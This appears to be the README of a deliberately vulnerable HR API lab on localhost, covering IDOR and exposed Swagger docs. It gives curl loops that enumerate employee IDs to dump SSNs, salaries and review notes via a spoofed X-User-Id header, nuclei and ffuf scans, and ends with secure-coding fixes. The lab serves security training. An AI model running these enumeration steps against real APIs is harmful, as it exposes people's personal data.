# Lab 04 — IDOR + API Swagger Exposure 🔴

**Port:** `8004`  
**Stack:** Node.js + PostgreSQL  
**Difficulty:** Beginner–Intermediate  
**Swagger UI:** `http://localhost:8004/api-docs`

---

## 🕳️ Security Loopholes

### 1. Swagger/OpenAPI Exposed in Production
The Swagger UI and raw JSON spec (`/api-docs.json`) are publicly accessible. The spec reveals:
- All internal endpoint paths
- Parameter names and types
- Internal field names (including `ssn`, `salary`)
- Internal infrastructure notes (`DB: hrdb@postgres:5432, s3://company-hr-backups`)
- Contact emails for social engineering

### 2. IDOR on All Employee Endpoints
No ownership check — any authenticated employee can access:
- Another employee's SSN and salary (`GET /employees/:id`)
- Any employee's payslips (`GET /employees/:id/payslips`)
- Confidential performance review notes (`GET /employees/:id/reviews`)

### 3. Cosmetic Admin Endpoint
`/admin/employees` is labelled "admin only" in Swagger but has **no actual authorization check** — any user can call it and dump all employee PII.

---

## 🎯 Attack Scenarios

### Scenario A — Recon via Swagger
```bash
docker compose up -d

# Open Swagger UI in browser
open http://localhost:8004/api-docs

# Download the spec for offline analysis
curl http://localhost:8004/api-docs.json | python3 -m json.tool

# Extract all endpoint paths from spec
curl -s http://localhost:8004/api-docs.json | \
  python3 -c "import sys,json; spec=json.load(sys.stdin); [print(p) for p in spec['paths']]"

# Find hidden/internal fields revealed in the spec
curl -s http://localhost:8004/api-docs.json | grep -i 'ssn\|salary\|secret\|internal\|s3\|backup'
```

### Scenario B — Mass PII Exfiltration
```bash
# Enumerate all employees (dump SSN + salary for everyone)
for i in $(seq 1 20); do
  result=$(curl -s http://localhost:8004/employees/$i -H "X-User-Id: 2")
  if echo "$result" | grep -q '"id"'; then
    echo "Employee $i:" && echo $result | python3 -m json.tool
  fi
done

# Hit the "admin" endpoint — no auth needed beyond basic header
curl http://localhost:8004/admin/employees -H "X-User-Id: 2"
```

### Scenario C — Salary/Payslip Comparison + Insider Trading
```bash
# Read CEO's payslip as a regular employee
curl http://localhost:8004/employees/4/payslips -H "X-User-Id: 2"

# Read confidential PIP/promotion notes
curl http://localhost:8004/employees/2/reviews -H "X-User-Id: 2"
curl http://localhost:8004/employees/3/reviews -H "X-User-Id: 2"
```

### Scenario D — Automated API Scanning Using Swagger Spec
```bash
# Use nuclei with swagger template
nuclei -u http://localhost:8004 -t exposures/apis/swagger-api.yaml

# Use ffuf driven by swagger paths
curl -s http://localhost:8004/api-docs.json | \
  python3 -c "
import sys, json
spec = json.load(sys.stdin)
for path in spec['paths']:
    print(path.replace('{id}', 'FUZZ'))
" > paths.txt

ffuf -u http://localhost:8004FUZZ -w paths.txt -H "X-User-Id: 2" -mc 200
```

---

## 🛠️ Tools

| Tool | Use |
|------|-----|
| Browser | Open `/api-docs` — instant recon |
| `nuclei` | `nuclei -u http://localhost:8004 -t exposures/` |
| `ffuf` | Fuzz IDs from discovered paths |
| `postman` | Import swagger JSON directly |
| `curl` | Manual IDOR exploitation |

---

## 🔐 How to Fix

```javascript
// 1. Disable Swagger in production
if (process.env.NODE_ENV !== 'production') {
  app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDoc));
}

// 2. Enforce ownership on every route
app.get('/employees/:id', auth, async (req, res) => {
  // Only HR/admin roles or own record
  if (req.userId !== parseInt(req.params.id) && req.userRole !== 'hr' && req.userRole !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // ...
});

// 3. Never return SSN in API responses — mask it
employee.ssn = '***-**-' + employee.ssn.slice(-4);

// 4. Use RBAC middleware on admin routes
app.get('/admin/employees', auth, requireRole('admin'), async (req, res) => { ... });
```
